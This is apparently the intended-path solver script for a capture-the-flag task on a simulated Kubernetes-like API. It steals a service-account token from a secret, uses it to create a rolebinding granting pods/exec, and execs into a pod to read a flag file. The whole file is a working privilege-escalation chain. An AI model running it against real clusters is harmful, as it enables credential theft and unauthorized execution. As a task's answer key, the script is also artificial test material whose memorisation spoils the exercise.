"""Intended-path solver: token theft, binding escalation, exec."""

import base64

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

CORE = "/api/v1/namespaces/prod"
RBAC = "/apis/rbac.authorization.k8s.io/v1/namespaces/prod"
SELF_REVIEW = "/apis/authorization.sim.io/v1/selfsubjectrulesreviews"
START_TOKEN = "sim-token-metrics-agent"


def _hdr(token: str) -> dict:
    return {"Authorization": f"Bearer {token}"}


def _rule_allows(rules: list[dict], verb: str, resource: str) -> bool:
    return any(rule.get("resource") == resource and verb in rule.get("verbs", []) for rule in rules)


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url()

    def fail(detail: str) -> SolveResult:
        return SolveResult(
            results=[TaskResult(task_id="rbac-escalation-exec", ok=False, detail=detail)]
        )

    me = httpx.get(f"{base}{SELF_REVIEW}", headers=_hdr(START_TOKEN), timeout=10).json()
    if not _rule_allows(me["rules"], "get", "secrets"):
        return fail("starting identity cannot read secrets")

    bindings = httpx.get(
        f"{base}{RBAC}/rolebindings", headers=_hdr(START_TOKEN), timeout=10
    ).json()["items"]
    roles_doc = httpx.get(f"{base}{RBAC}/roles", headers=_hdr(START_TOKEN), timeout=10).json()[
        "items"
    ]
    roles = {r["metadata"]["name"]: r["rules"] for r in roles_doc}

    target_sa = None
    for binding in bindings:
        if _rule_allows(roles.get(binding["roleRef"]["name"], []), "create", "rolebindings"):
            for subject in binding["subjects"]:
                if subject["kind"] == "ServiceAccount" and subject["name"] != me["serviceAccount"]:
                    target_sa = subject["name"]
    if not target_sa:
        return fail("no SA with rolebinding-create rights found")

    sa_doc = httpx.get(
        f"{base}{CORE}/serviceaccounts/{target_sa}", headers=_hdr(START_TOKEN), timeout=10
    ).json()
    secret_name = sa_doc["secrets"][0]
    secret = httpx.get(
        f"{base}{CORE}/secrets/{secret_name}", headers=_hdr(START_TOKEN), timeout=10
    ).json()
    stolen_token = base64.b64decode(secret["data"]["token"]).decode()

    review = httpx.get(f"{base}{SELF_REVIEW}", headers=_hdr(stolen_token), timeout=10).json()
    if review["serviceAccount"] != target_sa:
        return fail("stolen token did not authenticate as the target SA")
    if _rule_allows(review["rules"], "create", "pods/exec"):
        return fail("target already had exec; chain assumption broken")

    exec_role = next(
        (name for name, rules in roles.items() if _rule_allows(rules, "create", "pods/exec")),
        None,
    )
    if not exec_role:
        return fail("no role grants pods/exec create")

    created = httpx.post(
        f"{base}{RBAC}/rolebindings",
        headers=_hdr(stolen_token),
        json={
            "metadata": {"name": f"{target_sa}-escalated"},
            "roleRef": {"kind": "Role", "name": exec_role},
            "subjects": [{"kind": "ServiceAccount", "name": target_sa}],
        },
        timeout=10,
    )
    if created.status_code != 201:
        return fail(f"binding creation returned {created.status_code}")

    pods = httpx.get(f"{base}{CORE}/pods", headers=_hdr(stolen_token), timeout=10).json()["items"]
    if not pods:
        return fail("no pods visible after escalation")
    pod = pods[0]["metadata"]["name"]

    res = httpx.post(
        f"{base}{CORE}/pods/{pod}/exec",
        headers=_hdr(stolen_token),
        json={"command": ["cat", "/var/run/secrets/flag.txt"]},
        timeout=10,
    )
    flags = find_flags(res.text)
    captured = flags[0] if flags else None
    return SolveResult(
        results=[
            TaskResult(
                task_id="rbac-escalation-exec",
                ok=bool(captured),
                captured=captured,
                detail=None if captured else f"exec into {pod} produced no flag",
            )
        ]
    )
